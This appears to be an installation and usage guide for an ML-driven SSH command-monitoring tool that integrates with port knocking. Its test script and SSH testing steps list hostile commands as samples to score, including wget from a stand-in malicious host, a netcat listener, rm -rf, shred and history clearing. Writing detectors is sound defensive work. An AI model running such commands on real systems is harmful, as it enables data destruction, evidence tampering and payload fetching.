# AI-Based Behavioral Monitoring System - Complete Installation & Usage Guide

## 📋 Table of Contents
- [Overview](#overview)
- [System Requirements](#system-requirements)
- [Installation Guide](#installation-guide)
- [Configuration](#configuration)
- [Usage Guide](#usage-guide)
- [Integration with Port Knocking](#integration-with-port-knocking)
- [Testing](#testing)
- [Troubleshooting](#troubleshooting)
- [Advanced Configuration](#advanced-configuration)
- [API Reference](#api-reference)

## 🎯 Overview

This AI-based behavioral monitoring system provides real-time SSH session monitoring using machine learning models trained on SSH attack data. It integrates seamlessly with your existing Dynamic Port Knocking system to provide comprehensive security.

### Key Features
- 🤖 **ML-Powered Detection**: Uses Random Forest, Logistic Regression, and SVM models
- 🔍 **Real-time Monitoring**: Continuous command analysis and risk assessment
- 🚨 **Automatic Response**: Immediate blacklisting of malicious users
- 🔧 **Modular Design**: Easy integration with existing security systems
- 📊 **Comprehensive Logging**: Full audit trail and statistics

## 💻 System Requirements

### Operating System
- **Linux** (Ubuntu 20.04+, CentOS 7+, RHEL 8+)
- **WSL Ubuntu** (Windows Subsystem for Linux)
- **macOS** (with some limitations)

### Hardware Requirements
- **CPU**: 1+ cores (2+ recommended)
- **RAM**: 2GB+ (4GB+ recommended)
- **Storage**: 1GB+ free space
- **Network**: Internet connection for package installation

### Software Requirements
- **Python**: 3.7+ (3.8+ recommended)
- **SSH Server**: OpenSSH server
- **System Tools**: auditd, strace, iptables (optional)

## 🚀 Installation Guide

### Step 1: System Preparation

#### Ubuntu/Debian Systems
```bash
# Update system packages
sudo apt update && sudo apt upgrade -y

# Install essential packages
sudo apt install -y python3 python3-pip python3-venv git curl wget

# Install system monitoring tools
sudo apt install -y auditd strace procps openssh-server

# Install Python development tools
sudo apt install -y python3-dev build-essential
```

#### CentOS/RHEL Systems
```bash
# Update system packages
sudo yum update -y

# Install essential packages
sudo yum install -y python3 python3-pip git curl wget

# Install system monitoring tools
sudo yum install -y audit strace procps openssh-server

# Install Python development tools
sudo yum install -y python3-devel gcc
```

#### WSL Ubuntu
```bash
# Update WSL
sudo apt update && sudo apt upgrade -y

# Install packages (auditd may not work in WSL)
sudo apt install -y python3 python3-pip python3-venv git curl wget strace procps openssh-server
```

### Step 2: Project Setup

```bash
# Navigate to your project directory
cd /path/to/your/project

# Create behavioral monitoring directory
mkdir behavioral_monitor
cd behavioral_monitor

# Download or copy the behavioral monitoring files
# Ensure you have these files:
# - behavioral_monitor.py
# - ssh_command_capture.py
# - integration_example.py
# - monitor_config.json
# - integrated_config.json
# - requirements_behavioral_monitor.txt
```

### Step 3: Python Environment Setup

#### Option A: Virtual Environment (Recommended)
```bash
# Create virtual environment
python3 -m venv behavioral_env

# Activate virtual environment
source behavioral_env/bin/activate

# Upgrade pip
pip install --upgrade pip

# Install Python dependencies
pip install -r requirements_behavioral_monitor.txt
```

#### Option B: System-wide Installation
```bash
# Install packages via apt (Ubuntu/Debian)
sudo apt install -y python3-pandas python3-numpy python3-scikit-learn python3-psutil

# Install remaining packages via pip
pip3 install --user joblib pyarrow requests matplotlib seaborn
```

#### Option C: User Installation
```bash
# Install for current user only
pip3 install --user pandas numpy scikit-learn joblib pyarrow psutil requests matplotlib seaborn
```

### Step 4: Verify Installation

```bash
# Test Python packages
python3 -c "
import pandas as pd
import numpy as np
import sklearn
import joblib
import psutil
print('✅ All packages installed successfully!')
print(f'pandas: {pd.__version__}')
print(f'numpy: {np.__version__}')
print(f'scikit-learn: {sklearn.__version__}')
print(f'psutil: {psutil.__version__}')
"
```

### Step 5: SSH Server Configuration

```bash
# Start SSH service
sudo systemctl start ssh
sudo systemctl enable ssh

# Check SSH status
sudo systemctl status ssh

# Create test user (optional)
sudo adduser testuser
# Set password when prompted

# Configure SSH for password authentication (if needed)
sudo nano /etc/ssh/sshd_config
# Change: PasswordAuthentication yes
# Save: Ctrl+X, Y, Enter

# Restart SSH
sudo systemctl restart ssh
```

### Step 6: System Monitoring Setup

#### For Linux Systems (auditd)
```bash
# Start auditd service
sudo systemctl start auditd
sudo systemctl enable auditd

# Check auditd status
sudo systemctl status auditd

# Add audit rules for SSH monitoring
sudo auditctl -a always,exit -F arch=b64 -S execve -F path=/usr/bin/ssh -k ssh_commands
sudo auditctl -a always,exit -F arch=b64 -S execve -F path=/usr/bin/bash -k ssh_commands
sudo auditctl -a always,exit -F arch=b64 -S execve -F path=/bin/bash -k ssh_commands

# Verify rules
sudo auditctl -l
```

#### For WSL (auditd not available)
```bash
# WSL users can skip auditd setup
# The system will automatically use log monitoring
echo "WSL detected - using log monitoring instead of auditd"
```

## ⚙️ Configuration

### Step 1: Basic Configuration

Edit `monitor_config.json`:
```json
{
    "log_file": "behavioral_monitor.log",
    "log_level": "INFO",
    "blacklist_file": "blacklisted_users.json",
    "model_dir": "partb-2nd/results/models",
    "max_session_commands": 1000,
    "risk_threshold": 0.7,
    "command_window_size": 10,
    "session_timeout_minutes": 30,
    "update_interval_seconds": 5,
    "ssh_log_file": "/var/log/auth.log",
    "enable_real_time_monitoring": true,
    "enable_blacklisting": true,
    "notification_webhook": null,
    "backup_interval_hours": 24
}
```

### Step 2: Integrated Configuration

Edit `integrated_config.json`:
```json
{
    "monitor_config": "monitor_config.json",
    "enable_port_knocking": true,
    "enable_behavioral_monitoring": true,
    "enable_command_capture": true,
    "integration_log_file": "integrated_security.log",
    "webhook_url": null,
    "alert_threshold": 0.8,
    "auto_blacklist": true,
    "session_timeout_minutes": 30
}
```

### Step 3: Risk Thresholds

Adjust risk thresholds based on your security requirements:

| Risk Level | Score Range | Action |
|------------|-------------|---------|
| Low Risk | 0.0 - 0.3 | Monitor only |
| Medium Risk | 0.3 - 0.6 | Warning logged |
| High Risk | 0.6 - 0.8 | Blacklist user |
| Critical Risk | 0.8 - 1.0 | Immediate blacklist + alert |

## 🚀 Usage Guide

### Step 1: Basic Testing

#### Test Behavioral Monitor
```bash
# Activate virtual environment (if using)
source behavioral_env/bin/activate

# Test basic functionality
python3 behavioral_monitor.py --test "ls -la" --user "testuser"

# Test suspicious command
python3 behavioral_monitor.py --test "cat /etc/passwd" --user "testuser"

# Test malicious command
python3 behavioral_monitor.py --test "sudo su" --user "testuser"

# Check system statistics
python3 behavioral_monitor.py --stats
```

#### Test Command Capture
```bash
# Test command capture
python3 ssh_command_capture.py

# This will start monitoring SSH commands
# Press Ctrl+C to stop
```

### Step 2: Integration Testing

#### Test Complete System
```bash
# Test the integrated system
python3 integration_example.py --test

# This runs through:
# - User login simulation
# - Normal command testing
# - Suspicious command testing
# - Risk assessment
# - Blacklist functionality
```

#### Check System Status
```bash
# Check system status
python3 integration_example.py --status

# View detailed statistics
python3 behavioral_monitor.py --stats
```

### Step 3: Real-time Monitoring

#### Start Behavioral Monitoring
```bash
# Start the behavioral monitor
python3 behavioral_monitor.py &

# Check if it's running
ps aux | grep behavioral_monitor

# View logs
tail -f behavioral_monitor.log
```

#### Start Integrated System
```bash
# Start the complete integrated system
python3 integration_example.py &

# Check status
python3 integration_example.py --status
```

### Step 4: SSH Testing

#### Connect via SSH
```bash
# In another terminal, connect via SSH
ssh testuser@localhost
# Enter password when prompted

# Run commands to test monitoring:
# Normal commands
ls -la
pwd
whoami

# Suspicious commands
ps aux
netstat -tuln

# Malicious commands
cat /etc/passwd
sudo su
history -c

# Exit SSH
exit
```

#### Monitor Results
```bash
# Check logs for captured events
tail -f behavioral_monitor.log

# Check blacklisted users
cat blacklisted_users.json

# Check user status
python3 behavioral_monitor.py --status "testuser"
```

### Step 5: Advanced Testing

#### Create Test Script
```bash
# Create comprehensive test script
cat > comprehensive_test.py << 'EOF'
#!/usr/bin/env python3
"""
Comprehensive Test Script for Behavioral Monitoring
"""

from behavioral_monitor import BehavioralMonitor
import time

def run_comprehensive_test():
    print("🚀 Starting Comprehensive Behavioral Monitor Test...")
    
    # Initialize monitor
    monitor = BehavioralMonitor()
    
    # Test scenarios
    test_scenarios = [
        {
            "name": "Normal User Behavior",
            "commands": ["ls -la", "pwd", "whoami", "date"],
            "expected_risk": "Low"
        },
        {
            "name": "System Reconnaissance",
            "commands": ["ps aux", "netstat -tuln", "lsof", "who"],
            "expected_risk": "Medium"
        },
        {
            "name": "Privilege Escalation",
            "commands": ["sudo su", "chmod +s", "passwd", "visudo"],
            "expected_risk": "High"
        },
        {
            "name": "Data Exfiltration",
            "commands": ["scp file.txt user@remote:/tmp/", "wget http://malicious.com/file", "nc -l 4444"],
            "expected_risk": "High"
        },
        {
            "name": "Defense Evasion",
            "commands": ["history -c", "rm -rf /tmp/*", "shred -u file.txt"],
            "expected_risk": "Critical"
        }
    ]
    
    for scenario in test_scenarios:
        print(f"\n📊 Testing: {scenario['name']}")
        print("-" * 50)
        
        cumulative_risk = 0.0
        for command in scenario['commands']:
            result = monitor.test_command("testuser", command)
            risk_score = result['risk_score']
            cumulative_risk = result['cumulative_risk']
            
            # Color code output
            if risk_score < 0.3:
                risk_level = "🟢 LOW"
            elif risk_score < 0.6:
                risk_level = "🟡 MEDIUM"
            elif risk_score < 0.8:
                risk_level = "🟠 HIGH"
            else:
                risk_level = "🔴 CRITICAL"
            
            print(f"Command: {command}")
            print(f"Risk Score: {risk_score:.3f} {risk_level}")
            print(f"Cumulative Risk: {cumulative_risk:.3f}")
            print(f"Model Used: {result['model_used']}")
            print("-" * 30)
            time.sleep(1)
        
        print(f"Expected: {scenario['expected_risk']}")
        print(f"Final Cumulative Risk: {cumulative_risk:.3f}")
    
    # Test blacklist functionality
    print("\n🔒 Testing Blacklist Functionality:")
    print("-" * 50)
    
    monitor.blacklist_user("malicious_user", "Comprehensive test blacklisting")
    stats = monitor.get_system_stats()
    print(f"Blacklisted users: {stats['blacklisted_users']}")
    
    monitor.remove_from_blacklist("malicious_user")
    print("✅ Blacklist test completed")
    
    print("\n🎉 Comprehensive Test Completed Successfully!")

if __name__ == "__main__":
    run_comprehensive_test()
EOF

# Make executable and run
chmod +x comprehensive_test.py
python3 comprehensive_test.py
```

## 🔗 Integration with Port Knocking

### Step 1: Basic Integration

```python
# In your port knocking system
from behavioral_monitor import BehavioralMonitor

# Initialize behavioral monitor
behavioral_monitor = BehavioralMonitor()

# After successful port knocking and TOTP verification
def on_successful_authentication(user_ip, username):
    # Your existing code: Grant SSH access
    grant_ssh_access(user_ip)
    
    # Start behavioral monitoring
    behavioral_monitor.start_monitoring()
    
    # Send notification
    send_telegram_alert(f"User {username} authenticated. Behavioral monitoring active.")
```

### Step 2: Advanced Integration

```python
# Complete integration example
class IntegratedSecuritySystem:
    def __init__(self):
        self.port_knocker = PortKnocker()
        self.totp_verifier = TOTPVerifier()
        self.behavioral_monitor = BehavioralMonitor()
        self.telegram_bot = TelegramBot()
    
    def handle_connection_attempt(self, client_ip):
        # 1. Port knocking
        if self.port_knocker.verify_sequence(client_ip):
            
            # 2. TOTP verification
            if self.totp_verifier.verify_totp(client_ip):
                
                # 3. Grant access
                self.open_ssh_access(client_ip)
                
                # 4. Start behavioral monitoring
                self.behavioral_monitor.start_monitoring()
                
                # 5. Send notification
                self.telegram_bot.send_alert(f"Access granted to {client_ip}")
                
                return True
        return False
    
    def monitor_session(self, username, command):
        # Behavioral monitoring
        result = self.behavioral_monitor.analyze_user_behavior(username, command)
        
        if result['cumulative_risk'] > 0.8:
            # High risk detected
            self.behavioral_monitor.blacklist_user(username, "High risk behavior")
            self.telegram_bot.send_alert(f"User {username} blacklisted for suspicious behavior")
            self.close_ssh_access(username)
```

## 🧪 Testing

### Step 1: Unit Testing

```bash
# Test individual components
python3 -c "
from behavioral_monitor import BehavioralMonitor
monitor = BehavioralMonitor()

# Test risk assessment
result = monitor.test_command('testuser', 'ls -la')
print(f'Normal command risk: {result["risk_score"]:.3f}')

result = monitor.test_command('testuser', 'cat /etc/passwd')
print(f'Suspicious command risk: {result["risk_score"]:.3f}')

result = monitor.test_command('testuser', 'sudo su')
print(f'Malicious command risk: {result["risk_score"]:.3f}')
"
```

### Step 2: Integration Testing

```bash
# Test complete workflow
python3 integration_example.py --test

# Test with real SSH connections
python3 integration_example.py &
ssh testuser@localhost
# Run various commands
exit
```

### Step 3: Performance Testing

```bash
# Test with high command volume
python3 -c "
from behavioral_monitor import BehavioralMonitor
import time

monitor = BehavioralMonitor()
start_time = time.time()

# Test 1000 commands
for i in range(1000):
    monitor.test_command('testuser', f'command_{i}')

end_time = time.time()
print(f'Processed 1000 commands in {end_time - start_time:.2f} seconds')
"
```

## 🔧 Troubleshooting

### Common Issues

#### 1. Python Package Installation Issues
```bash
# Problem: "externally-managed-environment" error
# Solution: Use virtual environment
python3 -m venv behavioral_env
source behavioral_env/bin/activate
pip install -r requirements_behavioral_monitor.txt
```

#### 2. auditd Not Working (WSL)
```bash
# Problem: auditd service fails to start
# Solution: Use log monitoring instead
# The system automatically falls back to log monitoring
python3 ssh_command_capture.py
```

#### 3. Permission Issues
```bash
# Problem: Cannot read SSH logs
# Solution: Fix permissions
sudo chmod 644 /var/log/auth.log
sudo chown root:root behavioral_monitor.py
```

#### 4. ML Models Not Found
```bash
# Problem: "No ML models found" warning
# Solution: Use rule-based detection (works fine)
# Or train models in partb-2nd project
cd partb-2nd
jupyter notebook notebooks/section2_supervised_learning_classification.ipynb
```

### Debug Mode

```bash
# Enable debug logging
# Edit monitor_config.json
"log_level": "DEBUG"

# Run with verbose output
python3 behavioral_monitor.py --debug
```

### Log Analysis

```bash
# View real-time logs
tail -f behavioral_monitor.log

# Search for specific events
grep "blacklisted" behavioral_monitor.log

# Check error logs
grep "ERROR" behavioral_monitor.log
```

## ⚙️ Advanced Configuration

### Step 1: Custom Risk Thresholds

Edit `monitor_config.json`:
```json
{
    "risk_threshold": 0.7,
    "warning_threshold": 0.5,
    "critical_threshold": 0.9,
    "auto_blacklist_threshold": 0.8
}
```

### Step 2: Custom Suspicious Patterns

Edit `monitor_config.json`:
```json
{
    "suspicious_patterns": {
        "custom_category": [
            "your_custom_command",
            "another_suspicious_command"
        ]
    }
}
```

### Step 3: Notification Configuration

```json
{
    "notification_settings": {
        "enable_email": true,
        "enable_webhook": true,
        "email_recipients": ["admin@example.com"],
        "webhook_url": "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
    }
}
```

### Step 4: Performance Tuning

```json
{
    "performance_settings": {
        "max_session_commands": 500,
        "command_window_size": 5,
        "update_interval_seconds": 10,
        "enable_caching": true
    }
}
```

## 📚 API Reference

### BehavioralMonitor Class

#### Initialization
```python
from behavioral_monitor import BehavioralMonitor

# Basic initialization
monitor = BehavioralMonitor()

# With custom config
monitor = BehavioralMonitor("custom_config.json")
```

#### Core Methods
```python
# Start monitoring
monitor.start_monitoring()

# Stop monitoring
monitor.stop_monitoring()

# Analyze command
result = monitor.analyze_user_behavior(username, command)

# Test command (without affecting session)
result = monitor.test_command(username, command)

# Get user status
status = monitor.get_user_status(username)

# Get system statistics
stats = monitor.get_system_stats()

# Blacklist user
monitor.blacklist_user(username, reason)

# Remove from blacklist
monitor.remove_from_blacklist(username)
```

#### Result Format
```python
{
    'username': 'testuser',
    'command': 'cat /etc/passwd',
    'risk_score': 0.85,
    'cumulative_risk': 0.75,
    'model_used': 'random_forest',
    'blacklisted': False,
    'session_duration': 120
}
```

### SSHCommandCapture Class

```python
from ssh_command_capture import SSHCommandCapture

def handle_event(event):
    print(f"Captured: {event}")

capture = SSHCommandCapture(handle_event)
capture.start_capture('auditd')  # or 'log_monitoring'
capture.stop_capture()
```

## 📊 Monitoring and Maintenance

### Daily Monitoring

```bash
# Check system status
python3 behavioral_monitor.py --stats

# View recent logs
tail -20 behavioral_monitor.log

# Check blacklisted users
cat blacklisted_users.json
```

### Weekly Maintenance

```bash
# Rotate log files
sudo logrotate /etc/logrotate.d/behavioral_monitor

# Clean old sessions
python3 -c "
from behavioral_monitor import BehavioralMonitor
monitor = BehavioralMonitor()
# Old sessions are automatically cleaned up
"

# Update ML models (if needed)
cd partb-2nd
python3 retrain_models.py
```

### Monthly Review

```bash
# Generate monthly report
python3 -c "
from behavioral_monitor import BehavioralMonitor
monitor = BehavioralMonitor()
stats = monitor.get_system_stats()
print(f'Monthly Statistics: {stats}')
"
```

## 🎯 Conclusion

This AI-based behavioral monitoring system provides enterprise-grade SSH security monitoring. It integrates seamlessly with your existing port knocking system and provides real-time threat detection and response.

### Key Benefits
- ✅ **Zero Impact**: Doesn't modify your existing port knocking system
- ✅ **AI-Powered**: Uses ML models for sophisticated threat detection
- ✅ **Real-time**: Continuous monitoring and immediate response
- ✅ **Configurable**: Extensive customization options
- ✅ **Production-Ready**: Comprehensive logging and error handling

### Next Steps
1. **Install** the system following this guide
2. **Test** with the provided test scripts
3. **Integrate** with your port knocking system
4. **Monitor** and adjust thresholds as needed
5. **Deploy** in production environment

For support and questions, refer to the troubleshooting section or create an issue in the repository. 🚀 